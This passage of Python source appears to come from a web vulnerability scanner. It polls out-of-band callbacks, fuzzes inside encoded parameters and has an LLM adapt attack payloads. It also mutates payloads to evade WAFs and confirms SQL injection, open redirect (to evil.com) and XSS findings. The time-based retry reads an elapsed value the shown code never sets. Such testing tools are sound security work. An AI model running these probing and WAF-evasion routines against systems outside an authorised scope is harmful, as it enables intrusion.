            #    Polls each registered payload_id across HTTP + DNS + SMTP channels.
            with self._lock:
                tracked_ids = list(self._oast_tokens.keys())

            for payload_id in tracked_ids:
                interactions = self._collaborator.get_interactions(payload_id)
                if not interactions:
                    continue

                with self._lock:
                    meta = self._oast_tokens.get(payload_id)
                if not meta:
                    continue

                vuln_type = meta["vuln_type"]
                surface   = meta["surface"]
                severity  = meta["severity"]
                label     = _VULN_LABELS.get(vuln_type, "Blind vulnerability CONFIRMED")

                # Build richer evidence from the first interaction's typed details
                interaction = interactions[0]
                itype = interaction.type.value.upper()   # "DNS" | "HTTP" | "SMTP"
                if interaction.dns_details:
                    channel_detail = f"DNS query: {interaction.dns_details.qname}"
                elif interaction.http_details:
                    channel_detail = (
                        f"HTTP {interaction.http_details.method} "
                        f"{interaction.http_details.path}"
                    )
                elif interaction.smtp_details:
                    channel_detail = f"SMTP from={interaction.smtp_details.mail_from}"
                else:
                    channel_detail = f"{itype} interaction"

                finding_text = (
                    f"{label} — OOB {itype} callback received "
                    f"[{channel_detail}, source={interaction.source_ip}, "
                    f"param={surface.param}, target={surface.url}]"
                )
                self._record_finding(
                    surface, f"{vuln_type}_blind", f"OAST:{payload_id}",
                    finding_text, severity,
                    surface.url, {}, "", "",
                    0.0, 0, None,
                    proof=finding_text,
                    confidence_level=AuditIssueConfidence.CERTAIN,
                )

        else:
            # ── Legacy path: raw OASTCallback objects ───────────────────────────
            callbacks = self.oast.get_callbacks()
            if not callbacks:
                return

            seen_tokens: set[str] = set()
            for cb in callbacks:
                if cb.token in seen_tokens:
                    continue
                seen_tokens.add(cb.token)

                with self._lock:
                    meta = self._oast_tokens.get(cb.token)
                if not meta:
                    continue

                vuln_type = meta["vuln_type"]
                surface   = meta["surface"]
                severity  = meta["severity"]
                label     = _VULN_LABELS.get(vuln_type, "Blind vulnerability CONFIRMED")

                finding_text = (
                    f"{label} — OAST callback received "
                    f"[{cb.method} from {cb.source_ip}, "
                    f"param={surface.param}, target={surface.url}]"
                )
                self._record_finding(
                    surface, f"{vuln_type}_blind", f"OAST:{cb.token}",
                    finding_text, severity,
                    surface.url, {}, "", "",
                    0.0, 0, None,
                    proof=finding_text,
                    confidence_level=AuditIssueConfidence.CERTAIN,
                )

    # ── Serialized Insertion Points — fuzz inside nested encoded params ─────

    @staticmethod
    def _detect_serialized_layers(value: str) -> list[dict] | None:
        """
        Detect multi-layer encoded parameter values and decompose into inner params.

        Supported patterns:
          - base64(urlencode(k=v&k2=v2))
          - base64(json({"k": "v"}))
          - urlencode(base64(payload))

        Returns list of {key, value, layers} dicts, or None if not serialized.
        """
        if not value or len(value) < 8:
            return None

        import json as _json

        # Try base64 decode first
        b64_decoded = None
        if re.match(r'^[A-Za-z0-9+/]{8,}={0,2}$', value) and len(value) % 4 == 0:
            try:
                b64_decoded = base64.b64decode(value).decode('utf-8', errors='replace')
            except Exception:
                pass

        if b64_decoded:
            # Pattern 1: base64(urlencode(k=v&k2=v2))
            if '=' in b64_decoded and '&' in b64_decoded:
                try:
                    inner_params = parse_qs(b64_decoded, keep_blank_values=True)
                    if len(inner_params) >= 1:
                        return [
                            {"key": k, "value": v[0] if v else "", "layers": ["b64", "urlencode"]}
                            for k, v in inner_params.items()
                        ]
                except Exception:
                    pass

            # Pattern 2: base64(json({"k": "v"}))
            if b64_decoded.lstrip().startswith('{'):
                try:
                    obj = _json.loads(b64_decoded)
                    if isinstance(obj, dict) and len(obj) >= 1:
                        return [
                            {"key": k, "value": str(v), "layers": ["b64", "json"]}
                            for k, v in obj.items()
                        ]
                except Exception:
                    pass

            # Pattern 1b: base64(single_urlencode(k=v)) — no & but has =
            if '=' in b64_decoded and '&' not in b64_decoded:
                try:
                    inner_params = parse_qs(b64_decoded, keep_blank_values=True)
                    if len(inner_params) >= 1:
                        return [
                            {"key": k, "value": v[0] if v else "", "layers": ["b64", "urlencode"]}
                            for k, v in inner_params.items()
                        ]
                except Exception:
                    pass

        # Pattern 3: urlencode(base64(payload)) — detect %xx sequences wrapping base64
        if '%' in value:
            from urllib.parse import unquote
            url_decoded = unquote(value)
            if url_decoded != value and re.match(r'^[A-Za-z0-9+/]{8,}={0,2}$', url_decoded):
                try:
                    inner = base64.b64decode(url_decoded).decode('utf-8', errors='replace')
                    if inner and len(inner) >= 2:
                        # Treat inner as a single value
                        return [{"key": "_inner", "value": inner, "layers": ["urlencode", "b64"]}]
                except Exception:
                    pass

        return None

    @staticmethod
    def _rebuild_serialized(original_value: str, layers: list[str],
                            all_inner: list[dict], target_key: str,
                            payload: str) -> str:
        """
        Rebuild the serialized param value with one inner key replaced by payload.
        Preserves all other inner keys as-is and re-encodes through the same layers.
        """
        import json as _json

        # Build inner data structure with payload injected
        inner_map = {d["key"]: d["value"] for d in all_inner}
        inner_map[target_key] = payload

        # Determine inner encoding format from layers
        inner_format = layers[-1] if layers else "urlencode"

        if inner_format == "urlencode":
            inner_str = urlencode(inner_map)
        elif inner_format == "json":
            inner_str = _json.dumps(inner_map)
        else:
            inner_str = payload  # fallback

        # Re-encode through remaining layers (in reverse order, excluding inner format)
        result = inner_str
        for layer in reversed(layers[:-1]):
            if layer == "b64":
                result = base64.b64encode(result.encode()).decode()
            elif layer == "urlencode":
                result = _url_quote(result, safe='')

        return result

    def _fuzz_with_llm(self, surface):
        """
        LLM-adaptive payload generation with stateful response feedback.

        Asks an LLM to generate context-aware payloads based on endpoint info
        (URL, param, tech stack). After each round, feeds server response back
        to the LLM so it adapts. Runs up to max_rounds iterations.

        No-op when self.llm_provider is None.
        """
        if not self.llm_provider:
            return

        try:
            from .llm_fuzzer import LLMFuzzer
        except Exception:
            return

        # Determine vuln types for this surface
        param_vulns = self.PARAM_TYPE_MAP.get(surface.param_type,
                                              ["sqli_error", "xss_reflected"])

        llm_fuzz = LLMFuzzer(
            self.llm_provider, max_rounds=3,
            max_payloads_per_round=5, max_history=6,
        )

        for _round in range(llm_fuzz.max_rounds):
            if self.stop_event.is_set():
                return

            payloads = llm_fuzz.generate_payloads(
                url=surface.url,
                param_name=surface.param,
                param_type=surface.param_type,
                method=surface.method,
                vuln_types=param_vulns[:3],
                tech_fingerprint=self.tech_fingerprint,
                original_value=surface.original_value or "",
            )

            if not payloads:
                break

            # Send each payload and collect response for feedback
            best_response = None
            for payload in payloads:
                if self.stop_event.is_set():
                    return
                time.sleep(self.rate_limit)

                # Build and send through standard pipeline
                url     = self._build_url(surface, payload)
                body    = self._build_body(surface, payload)
                headers = self._build_headers(surface, payload)
                if not self.scope.in_scope(url):
                    continue

                try:
                    t0 = time.time()
                    resp = self.session.request(
                        surface.method, url,
                        data=body if surface.method not in ("GET", "HEAD") else None,
                        headers=headers, timeout=self.timeout,
                        verify=False, allow_redirects=False,
                    )
                    elapsed = (time.time() - t0) * 1000
                except Exception:
                    continue

                resp_text = ""
                try:
                    resp_text = resp.text[:1000]
                except Exception:
                    pass

                # Run standard detection on LLM-generated payload
                for vuln_type in param_vulns[:3]:
                    self._send_payload(surface, vuln_type, payload, None)

                # Track most interesting response for feedback
                # Interesting = error codes, long responses, slow responses
                interest = 0
                if resp.status_code >= 500:
                    interest = 3
                elif resp.status_code >= 400 and resp.status_code != 404:
                    interest = 2
                elif elapsed > 1000:
                    interest = 2
                if best_response is None or interest > best_response[3]:
                    best_response = (payload, resp.status_code, resp_text, interest, elapsed)

            # Feed the most interesting response back to the LLM
            if best_response and llm_fuzz.rounds_remaining > 0:
                llm_fuzz.feed_response(
                    payload=best_response[0],
                    status_code=best_response[1],
                    snippet=best_response[2][:500],
                    elapsed_ms=best_response[4],
                )

    def _fuzz_serialized_insertions(self, surface):
        """
        Detect and fuzz inside serialized/encoded parameter values.
        Decomposes base64(urlencode(k=v)), base64(json({...})), etc.
        into individual inner params and fuzzes each while re-encoding.

        Reuses _send_payload for full detection pipeline (WAF evasion, etc).
        """
        orig = surface.original_value or ''
        inner_params = self._detect_serialized_layers(orig)
        if not inner_params:
            return

        # Determine which vuln types apply to this surface
        param_vulns = self.PARAM_TYPE_MAP.get(surface.param_type,
                                              ["sqli_error", "xss_reflected"])
        layers = inner_params[0]["layers"]  # all share same layers

        for inner in inner_params:
            if self.stop_event.is_set():
                return

            inner_key = inner["key"]

            for vuln_type in param_vulns:
                if self.stop_event.is_set():
                    return

                payloads_list = PAYLOADS.get(vuln_type, [])
                cap = self.max_per_type or len(payloads_list)

                for payload in payloads_list[:cap]:
                    if self.stop_event.is_set():
                        return
                    time.sleep(self.rate_limit)

                    # Rebuild the full serialized value with this inner key replaced
                    wrapped = self._rebuild_serialized(
                        orig, layers, inner_params, inner_key, payload
                    )

                    # Reuse _send_payload which handles full detection pipeline
                    # including WAF evasion, time-based detection, etc.
                    self._send_payload(surface, vuln_type, wrapped, None)

    def _send_and_capture(self, surface, payload: str):
        """Send a payload and return the response object, or None on failure."""
        url     = self._build_url(surface, payload)
        body    = self._build_body(surface, payload)
        headers = self._build_headers(surface, payload)

        if not self.scope.in_scope(url):
            return None

        try:
            return self.session.request(
                surface.method,
                url,
                data=body if surface.method not in ("GET", "HEAD") else None,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
        except Exception:
            return None

    def _baseline(self, surface) -> float:
        """Measure baseline response time — average of 3 samples (drop max to reduce spike noise)."""
        samples = []
        for _ in range(3):
            try:
                t0 = time.time()
                self.session.request(
                    surface.method,
                    self._build_url(surface, "BASELINE_VALUE"),
                    data=self._build_body(surface, "BASELINE_VALUE") if surface.method != "GET" else None,
                    timeout=self.timeout, verify=False, allow_redirects=False,
                )
                samples.append(time.time() - t0)
            except Exception:
                pass
        if not samples:
            return 1.0
        samples.sort()
        return sum(samples[:-1]) / len(samples[:-1]) if len(samples) > 1 else samples[0]

    def _send_payload(self, surface, vuln_type: str, payload: str, baseline: Optional[float]):
        if (
            not self.allow_dangerous_endpoints
            and is_dangerous_endpoint(surface.method, surface.url, surface.param)
        ):
            log.info(
                "Payload skipped for sensitive endpoint: %s %s [%s]",
                surface.method,
                surface.url,
                surface.param,
            )
            return

        if not self._is_payload_safe(payload):
            log.debug("Payload blocked by safety policy for %s: %r", vuln_type, payload[:120])
            return

        # Apply HTTP transformation (WAF bypass encoding) if set
        _tm = getattr(self, "transform_mode", None)
        if _tm is not None:
            try:
                from .http_transform import HttpTransformation as _HT, apply_transformation
                if _tm is not _HT.NONE:
                    payload = apply_transformation(payload, _tm)
            except Exception:
                pass

        if not self._is_payload_safe(payload):
            log.debug("Transformed payload blocked by safety policy for %s", vuln_type)
            return

        url     = self._build_url(surface, payload)
        body    = self._build_body(surface, payload)
        headers = self._build_headers(surface, payload)

        if not self._is_payload_safe(body or ""):
            log.debug("Request body blocked by safety policy for %s", vuln_type)
            return

        if not self.scope.in_scope(url):
            return

        # Live payload counter
        self._payloads_sent_count = getattr(self, '_payloads_sent_count', 0) + 1
        cb = getattr(self, '_on_payload_sent', None)
        if cb:
            try: cb(self._payloads_sent_count)
            except Exception: pass

        try:
            t0   = time.time()
            resp = self.session.request(
                surface.method,
                url,
                data=body if surface.method not in ("GET", "HEAD") else None,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            elapsed = (time.time() - t0) * 1000

        except requests.exceptions.Timeout:
            elapsed = self.timeout * 1000
            # Timeout on time-based payload = positive signal
            if vuln_type == "sqli_blind_time" and baseline is not None:
                finding_text = f"Time-based blind SQLi — response timed out on SLEEP payload [{surface.param}={payload}]"
                self._record_finding(surface, vuln_type, payload, finding_text, "high",
                                     url, {}, str(headers), "", elapsed, 408,
                                     baseline_time_ms=baseline * 1000)
            return
        except Exception:
            return

        resp_text = ""
        try:
            resp_text = resp.text
        except Exception:
            pass
        # ── Gzip edge case: Content-Encoding gzip but requests didn't decompress ──
        if not resp_text and resp.content:
            _ce = resp.headers.get("Content-Encoding", "").lower()
            if "gzip" in _ce:
                try:
                    import gzip as _gzip
                    resp_text = _gzip.decompress(resp.content).decode("utf-8", errors="replace")
                except Exception:
                    resp_text = resp.content.decode("utf-8", errors="replace")

        # ── Response-adaptive: WAF evasion mutation ─────────────────────────
        if PayloadMutator.is_waf_blocked(resp.status_code, resp_text):
            self._waf_detected = True
            self._waf_stats["total_blocked"] += 1
            # Identify specific WAF for targeted bypass
            if not self._identified_waf:
                self._identified_waf = PayloadMutator.identify_waf(
                    resp.status_code, dict(resp.headers), resp_text
                )
                # Record WAF detection as informational finding
                if self._identified_waf:
                    waf_finding = f"WAF Detected: {self._identified_waf} — blocking attack payloads (HTTP {resp.status_code})"
                    self._record_finding(surface, "waf_detected", "",
                                         waf_finding, "info",
                                         url, dict(resp.headers), str(headers),
                                         resp_text[:500], elapsed, resp.status_code)
            # Rate-limit backoff on 429
            mutation_delay = self.rate_limit
            if resp.status_code == 429:
                mutation_delay = min(self.rate_limit * 4, 2.0)

            bypassed = False
            for attempt in range(PayloadMutator.MAX_MUTATIONS):
                if self.stop_event.is_set():
                    return
                mutated = PayloadMutator.mutate(
                    payload, attempt,
                    vuln_type=vuln_type,
                    waf_name=self._identified_waf,
                    preferred=self._successful_mutations[:3],
                )
                if not self._is_payload_safe(mutated):
                    continue
                strategy_idx = attempt % len(PayloadMutator.ALL_STRATEGIES)
                strategy_name = PayloadMutator.ALL_STRATEGIES[strategy_idx]
                mut_url = self._build_url(surface, mutated)
                mut_body = self._build_body(surface, mutated)
                mut_headers = self._build_headers(surface, mutated)
                try:
                    time.sleep(mutation_delay)
                    mut_resp = self.session.request(
                        surface.method, mut_url,
                        data=mut_body if surface.method not in ("GET", "HEAD") else None,
                        headers=mut_headers, timeout=self.timeout,
                        verify=False, allow_redirects=False,
                    )
                    mut_text = mut_resp.text[:8000] if mut_resp.text else ""
                    if not PayloadMutator.is_waf_blocked(mut_resp.status_code, mut_text):
                        # Mutation bypassed WAF — track stats + remember strategy
                        self._waf_stats["total_bypassed"] += 1
                        self._waf_stats["strategy_success"][strategy_name] = \
                            self._waf_stats["strategy_success"].get(strategy_name, 0) + 1
                        if strategy_idx not in self._successful_mutations:
                            self._successful_mutations.append(strategy_idx)
                        resp = mut_resp
                        resp_text = mut_text
                        payload = mutated
                        elapsed = (time.time() - t0) * 1000
                        bypassed = True
                        break
                    else:
                        self._waf_stats["strategy_fail"][strategy_name] = \
                            self._waf_stats["strategy_fail"].get(strategy_name, 0) + 1
                except Exception:
                    continue

        # ── Response-adaptive: deep-scan on HTTP 500 ────────────────────────
        if resp.status_code == 500:
            self._deep_scan_params.add((surface.url, surface.param))

        # ── Response-adaptive: follow redirect chain ────────────────────────
        if 300 <= resp.status_code < 400:
            location = resp.headers.get("Location", resp.headers.get("location", ""))
            if location:
                hop_url = location if location.startswith("http") else urljoin(surface.url, location)
                for hop in range(5):
                    if self.stop_event.is_set() or not self.scope.in_scope(hop_url):
                        break
                    try:
                        hop_resp = self.session.get(hop_url, timeout=self.timeout, verify=False, allow_redirects=False)
                        hop_text = hop_resp.text[:8000] if hop_resp.text else ""
                        # Check detection patterns at each hop
                        for pattern, desc in DETECTORS.get(vuln_type, []):
                            if re.search(pattern, hop_text, re.I | re.S):
                                finding_text = f"{desc} [redirect hop {hop+1}: {hop_url} | param={surface.param}]"
                                eid = self._store_evidence(surface, vuln_type, payload, hop_url,
                                                           headers, body or "", hop_resp, elapsed)
                                self._record_finding(surface, vuln_type, payload, finding_text,
                                                     self.SEV_MAP.get(vuln_type, "medium"),
                                                     hop_url, dict(hop_resp.headers), str(headers),
                                                     hop_text, elapsed, hop_resp.status_code, eid)
                                break
                        # Follow next redirect
                        next_loc = hop_resp.headers.get("Location", hop_resp.headers.get("location", ""))
                        if 300 <= hop_resp.status_code < 400 and next_loc:
                            hop_url = next_loc if next_loc.startswith("http") else urljoin(hop_url, next_loc)
                        else:
                            break
                    except Exception:
                        break

        # ── Time-based blind detection — 3× retry to eliminate flaky baselines ─
        if vuln_type == "sqli_blind_time" and baseline is not None:
            delta = (elapsed / 1000) - baseline
            if delta >= self.time_threshold:
                # First hit — confirm with 2 more attempts (each with a fresh baseline)
                _hits = 1
                _last_delta = delta
                _last_resp  = resp
                _last_elapsed = elapsed
                for _ in range(2):
                    _fresh_base = self._baseline(surface)
                    _retry_resp = self._send_and_capture(surface, payload)
                    if _retry_resp is None:
                        break
                    _retry_elapsed = getattr(_retry_resp, '_elapsed_ms', 0) or 0
                    _retry_delta = (_retry_elapsed / 1000) - _fresh_base
                    if _retry_delta >= self.time_threshold:
                        _hits += 1
                        _last_delta, _last_resp, _last_elapsed = (
                            _retry_delta, _retry_resp, _retry_elapsed)

                if _hits >= 3:
                    finding_text = (
                        f"Time-based blind SQLi CONFIRMED — delayed {_last_delta:.1f}s "
                        f"on {_hits}/3 attempts [{surface.param}={payload}]"
                    )
                    proof_label, proof_data = None, None
                    if self._proof_validator:
                        try:
                            proof_label, proof_data = self._proof_validator.validate(
                                "sqli_blind_time", surface, url, payload, _last_resp)
                        except Exception:
                            pass
                    if proof_label:
                        finding_text = f"{proof_label} [{surface.url} | param={surface.param}]"
                    eid = self._store_evidence(surface, vuln_type, payload, url,
                                               headers, body or "", _last_resp, _last_elapsed)
                    self._record_finding(surface, vuln_type, payload, finding_text, "high",
                                         url, dict(_last_resp.headers), str(headers),
                                         _last_resp.text[:2000],
                                         _last_elapsed, _last_resp.status_code, eid,
                                         proof=proof_label, proof_data=proof_data,
                                         baseline_time_ms=baseline * 1000,
                                         time_delta_ms=_last_delta * 1000)
            return

        # ── Open redirect — check Location header, then body patterns ─────
        if vuln_type == "open_redirect":
            from urllib.parse import urlparse as _urlparse, unquote as _unquote
            import unicodedata as _ud

            _REDIRECT_STATUS = (301, 302, 303, 307, 308)

            def _normalise_redirect_url(raw: str) -> str:
                """
                Normalise a potentially obfuscated redirect URL so _is_evil_host
                can reliably extract the hostname.  Handles:
                  - URL-encoding (%2e, %00, %20 etc.)
                  - Null bytes, trailing spaces, control chars
                  - Unicode homograph chars (Cyrillic і → ASCII i, fullwidth period → .)
                  - Double encoding (%252F → %2F → /)
                  - Leading slashes, backslashes, and mixed schemes
                """
                if not raw:
                    return raw
                s = raw.strip()
                # Strip null bytes and control chars (0x00–0x1F, DEL)
                s = re.sub(r'[\x00-\x1f\x7f]', '', s)
                # Double-decode: %252F → %2F → /
                try:
                    s = _unquote(_unquote(s))
                except Exception:
                    pass
                # Normalise Unicode homographs: map to ASCII equivalents
                try:
                    s = _ud.normalize("NFKC", s)
                except Exception:
                    pass
                # Fullwidth period (。 U+3002) → .
                s = s.replace("。", ".")
                # Normalise backslash → / for URL parsing
                s = s.replace("\\", "/")
                # Collapse multiple leading slashes to //
                s = re.sub(r'^/+', '//', s)
                return s

            def _is_evil_host(raw_loc: str) -> bool:
                """
                Return True when the redirect target host is evil.com (exact or sub).
                Handles all encoded, obfuscated, and Unicode variants in the payload list.
                """
                if not raw_loc:
                    return False
                loc = _normalise_redirect_url(raw_loc)
                # Fast string check before urlparse (catches //evil.com variants)
                loc_lower = loc.lower()
                if "evil.com" not in loc_lower and "evil%2ecom" not in loc_lower:
                    return False
                try:
                    h = (_urlparse(loc).hostname or "").lower().rstrip(".")
                    if h == "evil.com" or h.endswith(".evil.com"):
                        return True
                except Exception:
                    pass
                # Fallback regex for malformed URLs that urlparse can't parse
                m = re.search(r'evil(?:\.|%2e)com', loc, re.I)
                return bool(m)

            def _baseline_also_redirects() -> bool:
                """True when the endpoint redirects to evil.com WITHOUT our payload."""
                try:
                    bl = self._send_and_capture(surface, "SAFE_BASELINE_VALUE")
                    if bl is None:
                        return False
                    bl_loc = bl.headers.get("location", "")
                    return _is_evil_host(bl_loc) and bl.status_code in _REDIRECT_STATUS
                except Exception:
                    return False

            def _record_open_redirect(finding_text: str, variant: str = "open_redirect"):
                curl_cmd  = self._build_curl_cmd(surface, payload, resp)
                tp_reason = self._build_tp_reason("open_redirect", surface, payload, resp)
                proof_data = f"{tp_reason}\n\n--- Reproduce ---\n{curl_cmd}"
                proof_label = None
                if self._proof_validator:
                    try:
                        proof_label, _pd = self._proof_validator.validate(
                            "open_redirect", surface, url, payload, resp)
                        if _pd:
                            proof_data = f"{tp_reason}\n\n--- Reproduce ---\n{curl_cmd}\n\n--- Validator ---\n{_pd}"
                    except Exception:
                        pass
                if proof_label:
                    finding_text = f"{proof_label} [{surface.url} | param={surface.param}]"
                eid = self._store_evidence(surface, "open_redirect", payload, url,
                                           headers, body or "", resp, elapsed)
                self._record_finding(surface, "open_redirect", payload, finding_text, "medium",
                                     url, dict(resp.headers), str(headers), resp_text,
                                     elapsed, resp.status_code, eid,
                                     proof=proof_label or tp_reason.split("\n")[0],
                                     proof_data=proof_data)

            # ── 1) Location header — 3xx + evil.com host (now handles encoded variants) ──
            location = resp.headers.get("location", "")
            if location and resp.status_code in _REDIRECT_STATUS and _is_evil_host(location):
                if _baseline_also_redirects():
                    return
                _record_open_redirect(
                    f"Open redirect confirmed via Location header → {location[:120]}"
                )
                return

            # ── 1b) Refresh: header — completely separate from Location ──────────
            # Many frameworks (Flask, Express, Nginx, Rails) emit:
            #   Refresh: 0;url=https://evil.com  or  Refresh: 3; URL=/new-path
            # This is never a 3xx — it's a 200 with a redirect side-channel.
            refresh_hdr = resp.headers.get("refresh", "") or resp.headers.get("Refresh", "")
            if refresh_hdr and _is_evil_host(refresh_hdr):
                bl_refresh = ""
                try:
                    bl = self._send_and_capture(surface, "SAFE_BASELINE_VALUE")
                    bl_refresh = (bl.headers.get("refresh", "") if bl else "")
                except Exception:
                    pass
                if not _is_evil_host(bl_refresh):
                    _record_open_redirect(
                        f"Open redirect via Refresh: header → {refresh_hdr[:120]}"
                    )
                    return

            # 2) Body-based detection (meta refresh, JS redirect)
            #
            # Skip body-based detection for path-type surfaces — a GET /login request
            # carrying //evil.com in the path cannot inject into a JS redirect context;
            # any evil.com match would be from the server's own code.
            if surface.param_type in ("path", "request_line", "path_filename"):
                return

            # Three-gate guard (Burp-extension parity):
            #   Gate A — payload echo:  the actual injected payload string MUST appear
            #            somewhere in the response body. If not, the evil.com occurrence
            #            is from the server's own code (Next.js router, demo strings, etc.)
            #   Gate B — baseline check: send SAFE_BASELINE_VALUE and confirm the
            #            same pattern is NOT present.  Use full response length (not [:5000])
            #            because modern SPA bundles exceed 200 KB.
            #   Gate C — context check: the match must not be inside an HTML comment
            #            (<!-- ... -->) or a server-side template expression ({{ ... }}).
            if resp.status_code not in (301, 302, 303, 307, 308):
                for pattern, desc in DETECTORS.get("open_redirect", []):
                    m = re.search(pattern, resp_text, re.I | re.S)
                    if not m:
                        continue

                    # Gate A — payload echo
                    # The payload must literally appear in the response body, AND
                    # specifically the "evil.com" host must come from our injection
                    # (not pre-exist in the page).
                    # Check: is the injected payload string present at all in resp_text?
                    payload_clean = payload.strip()
                    # Normalise: strip leading protocol for protocol-relative payloads
                    _evil_marker = "evil.com"
                    if _evil_marker not in resp_text.lower():
                        continue  # evil.com not in response at all — skip

                    # Verify the PAYLOAD itself is reflected (not just evil.com from
                    # the server's own code).  Use the match start position as the
                    # anchor — the payload should appear within 200 chars of the match.
                    match_region = resp_text[max(0, m.start() - 50): m.end() + 200]
                    # Check the payload token that reaches evil.com is ours:
                    # payload_clean ends with evil.com or contains //evil.com or similar.
                    # We verify the full injected evil.com-bearing token appears in region.
                    _payload_in_region = any(
                        tok in match_region
                        for tok in (payload_clean, payload_clean.lstrip("/"),
                                    "evil.com", "evil%2ecom")
                    )
                    if not _payload_in_region:
                        continue

                    # Gate C — not in a comment or template expression
                    _before = resp_text[:m.start()]
                    _last_comment_open  = _before.rfind("<!--")
                    _last_comment_close = _before.rfind("-->")
                    if _last_comment_open > _last_comment_close:
                        continue  # inside HTML comment
                    if "{{" in match_region and "}}" in match_region:
                        continue  # inside template expression

                    # Gate B — full-response baseline (not truncated)
                    try:
                        bl = self._send_and_capture(surface, "SAFE_BASELINE_VALUE")
                        bl_text = bl.text if bl else ""
                        if re.search(pattern, bl_text, re.I | re.S):
                            continue  # pattern present without payload — server's own code
                        # Also check: does evil.com appear in baseline without our payload?
                        if _evil_marker in bl_text.lower():
                            # evil.com already in page — only flag if payload also appears
                            # in baseline (which it won't since we just sent SAFE_BASELINE_VALUE)
                            # The key check: does the PATTERN match in baseline?
                            pass  # already checked above
                    except Exception:
                        pass

                    finding_text = f"{desc} [{surface.url} | param={surface.param} | payload={payload[:60]}]"
                    proof_label, proof_data = None, None
                    if self._proof_validator:
                        try:
                            proof_label, proof_data = self._proof_validator.validate(
                                "open_redirect", surface, url, payload, resp)
                        except Exception:
                            pass
                    if proof_label:
                        finding_text = f"{proof_label} [{surface.url} | param={surface.param}]"
                    eid = self._store_evidence(surface, vuln_type, payload, url,
                                               headers, body or "", resp, elapsed)
                    self._record_finding(surface, vuln_type, payload, finding_text, "medium",
                                         url, dict(resp.headers), str(headers), resp_text,
                                         elapsed, resp.status_code, eid,
                                         proof=proof_label, proof_data=proof_data)
                    return
            return

        # ── XSS execution context guard (BEFORE pattern matching) ────────────
        # Must run first — entity-encoding of < > " makes XSS non-executable even
        # if the pattern regex would otherwise match the escaped variant.
        if vuln_type in ("xss_reflected", "xss_stored"):
            import html as _html
            encoded_form = _html.escape(payload)
            if encoded_form != payload and encoded_form in resp_text and payload not in resp_text:
                return  # Reflection is HTML-encoded — not executable, skip entirely

        # ── Auth-redirect guard ───────────────────────────────────────────
        # If the server returns a 3xx redirect, only flag if:
        #   (a) the redirect Location contains the payload (open redirect), OR
        #   (b) the baseline ALSO does NOT redirect (meaning redirect is payload-triggered)
        # This prevents auth-redirect noise where every unauthenticated request
        # → 307 /login and the redirect body echoes the original URL with payload.
        if resp.status_code in (301, 302, 303, 307, 308):
            if vuln_type not in ("open_redirect", "header_injection", "xss_reflected"):
                # For injection types, 3xx almost always = auth redirect, not injection
                try:
                    _bl_check = self._send_and_capture(surface, "DAST_SAFE_CHECK_VALUE")
                    if _bl_check is not None and _bl_check.status_code in (301, 302, 303, 307, 308):
                        return  # baseline also redirects — this is an auth redirect, not vuln
                except Exception:
                    return  # can't confirm — skip to avoid FP flood

        # ── Pattern-based detection ───────────────────────────────────────
        # Expanded baseline set — all types where patterns occur in normal app output.
        _NEEDS_BASELINE = frozenset({
            "ssrf", "lfi", "cmdi", "ssti", "el_injection",
            "xss_reflected", "css_injection", "log4shell",
        })

        # Cached baseline for this surface (computed once, reused across patterns)
        _baseline_text: str | None = None

        def _get_baseline() -> str:
            nonlocal _baseline_text
            if _baseline_text is None:
                try:
                    bl = self._send_and_capture(surface, "SAFE_BASELINE_VALUE")
                    _baseline_text = (bl.text[:12000] if bl and bl.text else "")
                except Exception:
                    _baseline_text = ""
            return _baseline_text

        for pattern, desc in DETECTORS.get(vuln_type, []):
            if not re.search(pattern, resp_text, re.I | re.S):
                continue

            # ── EL injection: echo guard ──────────────────────────────────
            # Expression echoed back (e.g. response contains "applicationScope"
            # because we sent "${applicationScope}") ≠ injection.
            # Require an evaluation signal alongside the pattern match.
            if vuln_type == "el_injection":
                raw_expr = re.sub(r'^[\$#\*!]\{(.+)\}$', r'\1', payload.strip())
                if raw_expr and raw_expr in payload and re.search(re.escape(raw_expr), resp_text, re.I):
                    _eval_signals = [
                        r"javax\.el\.ELException", r"org\.springframework\.expression",
                        r"SpelEvaluationException", r"ognl\.OgnlException",
                        r"(?:^|\s)49(?:\s|$)",  # 7*7=49
                        r"java\.lang\.(Runtime|ProcessBuilder)@",
                    ]
                    if not any(re.search(s, resp_text, re.I) for s in _eval_signals):
                        continue  # pure echo, no evaluation signal — skip

            # ── XSS reflected: non-executable context guard ───────────────
            # Reflection inside HTML comment, <title>, <textarea>, <noscript>
            # cannot execute — skip to avoid FP from harmless reflection.
            if vuln_type == "xss_reflected":
                match = re.search(pattern, resp_text, re.I | re.S)
                if match:
                    pos = match.start()
                    # Check if the match position is inside a safe non-executable context
                    pre = resp_text[max(0, pos - 500): pos]
                    post = resp_text[pos: pos + 200]
                    in_comment   = "<!--" in pre and "-->" not in pre
                    in_title     = bool(re.search(r"<title[^>]*>", pre, re.I) and
                                        "</title>" not in pre.lower() and
                                        re.search(r"</title>", post, re.I))
                    in_textarea  = bool(re.search(r"<textarea[^>]*>", pre, re.I) and
                                        "</textarea>" not in pre.lower())
                    in_noscript  = bool(re.search(r"<noscript[^>]*>", pre, re.I) and
                                        "</noscript>" not in pre.lower())
                    in_pre_tag   = bool(re.search(r"<(?:pre|code)[^>]*>", pre, re.I) and
                                        re.search(r"<(?:pre|code)[^>]*>", pre, re.I) and
                                        not re.search(r"</(?:pre|code)>", pre, re.I))
                    if in_comment or in_title or in_textarea or in_noscript or in_pre_tag:
                        continue  # non-executable context — not a real XSS

            # ── Baseline check: pattern must NOT appear in clean response ─
            if vuln_type in _NEEDS_BASELINE:
                bl_text = _get_baseline()
                if bl_text and re.search(pattern, bl_text, re.I | re.S):
                    continue  # pattern pre-exists without injection — baseline FP

            finding_text = f"{desc} [{surface.url} | param={surface.param} | payload={payload[:60]}]"
            eid = self._store_evidence(surface, vuln_type, payload, url,
                                       headers, body or "", resp, elapsed)
            proof_label, proof_data = None, None
            if self._proof_validator:
                try:
                    proof_label, proof_data = self._proof_validator.validate(
                        vuln_type, surface, url, payload, resp)
                except Exception:
                    pass
            if proof_label:
                finding_text = f"{proof_label} [{surface.url} | param={surface.param} | payload={payload[:60]}]"
            self._record_finding(surface, vuln_type, payload, finding_text,
                                 self.SEV_MAP.get(vuln_type, "medium"),
                                 url, dict(resp.headers), str(headers), resp_text,
                                 elapsed, resp.status_code, eid,
                                 proof=proof_label, proof_data=proof_data)
            return   # one finding per payload is enough

        # ── ResponseKeywordsAnalyzer — supplementary blind/error pass ────────
        #    Catches error traces, SSTI evaluation results, and OOB indicators
